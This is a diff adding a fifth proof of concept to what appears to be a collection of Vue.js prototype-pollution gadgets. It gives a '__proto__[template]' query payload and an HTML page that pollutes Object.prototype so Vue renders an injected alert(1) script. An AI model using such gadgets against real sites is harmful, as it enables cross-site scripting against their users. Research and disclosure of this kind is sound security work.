@@ -128,3 +128,26 @@ var app = new Vue({
 });
 </script>
 ```
+
+#### PoC #5
+```
+?__proto__[template]=<script>alert(1)</script>"
+```
+
+```html
+<div id="app">
+    {{ message }}
+</div>
+<script>
+    Object.prototype.template = '<script>alert(1)<\/script>';
+</script>
+<script src="https://unpkg.com/vue/dist/vue.js"></script>
+<script>
+var app = new Vue({ 
+    el: '#app',
+    data: {
+        message: 'Hello Vue!'
+    }
+});
+</script>
+```
